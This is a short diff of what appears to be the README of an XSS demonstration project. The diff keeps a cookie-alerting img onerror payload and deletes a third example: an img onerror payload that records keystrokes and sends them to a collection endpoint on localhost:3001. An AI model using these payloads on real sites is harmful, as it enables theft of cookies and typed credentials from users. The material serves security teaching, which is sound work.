@@ -28,10 +28,3 @@ entered text is displayed right under the text area (text change forces update i
 ```html
 \<img src onerror="alert(document.cookie)" />
 ```
-
-3.
-```html
-<img src="does-not-exist" onerror="var timeout; var buffer = \'\'; document.querySelector(\'body\').addEventListener(\'keypress\', function(event) { if (event.which !== 0) { clearTimeout(timeout); buffer += String.fromCharCode(event.which); timeout = setTimeout(function() { var xhr = new XMLHttpRequest(); var uri = \'http://localhost:3001/keys?data=\' + encodeURIComponent(buffer); xhr.open(\'GET\', uri); xhr.send(); buffer = \'\'; }, 400); } });">
-```
-
-### Advice 
